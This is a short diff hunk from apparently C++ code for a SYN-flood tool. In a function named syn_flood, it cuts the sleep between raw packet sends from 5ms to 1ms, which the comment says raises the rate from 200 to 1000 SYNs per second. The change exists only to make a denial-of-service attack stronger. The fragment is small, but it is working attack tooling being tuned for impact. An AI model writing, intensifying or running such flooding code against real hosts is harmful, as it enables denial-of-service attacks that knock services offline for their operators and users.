@@ -107,7 +107,7 @@ void syn_flood() {
                    (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
             cerr << "Send failed: " << strerror(errno) << endl;
         }
-        usleep(5000); // 5ms delay, 200 SYNs/sec
+        usleep(1000); // 1ms delay, 1000 SYNs/sec
     }
     close(sock);
 }
